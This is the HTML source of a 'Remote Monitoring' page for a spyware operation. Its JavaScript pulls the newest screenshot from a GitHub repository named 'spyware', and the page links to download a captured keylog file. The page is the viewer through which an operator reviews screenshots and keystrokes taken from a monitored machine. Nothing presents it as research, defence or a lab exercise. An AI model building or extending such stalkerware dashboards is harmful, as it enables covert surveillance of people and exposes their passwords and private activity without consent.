<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Remote Monitoring - Latest Screenshot and Keylogs</title>
    <style>
        body {
            font-family: Arial, sans-serif;
        }
        img {
            width: 400px;
            height: auto;
            margin: 10px;
        }
    </style>
</head>
<body>
    <h1>Remote Monitoring - Latest Screenshot and Keylogs</h1>
    
    <h2>Latest Screenshot</h2>
    <div id="latest-screenshot">
        <!-- Latest screenshot will be shown here -->
        <script>
            const repo = "https://api.github.com/repos/shrijaybaheti/spyware/contents/screenshots";
            
            fetch(repo)
                .then(response => response.json())
                .then(data => {
                    // Filter to get only the screenshot files
                    const screenshots = data.filter(file => file.name.endsWith(".png"));

                    // Sort the files by date in descending order (latest first)
                    screenshots.sort((a, b) => new Date(b.commit.committer.date) - new Date(a.commit.committer.date));

                    // Get the latest screenshot
                    const latestScreenshot = screenshots[0];

                    // Display the latest screenshot
                    if (latestScreenshot) {
                        let img = document.createElement("img");
                        img.src = latestScreenshot.download_url; // Use the download URL for the image
                        document.getElementById("latest-screenshot").appendChild(img);
                    } else {
                        document.getElementById("latest-screenshot").innerText = "No screenshots available.";
                    }
                })
                .catch(error => console.error('Error fetching latest screenshot:', error));
        </script>
    </div>

    <h2>Keylogs</h2>
    <!-- Keylog file link -->
    <a href="https://github.com/shrijaybaheti/spyware/raw/main/keylog.txt" download>Download Keylog</a>

</body>
</html>
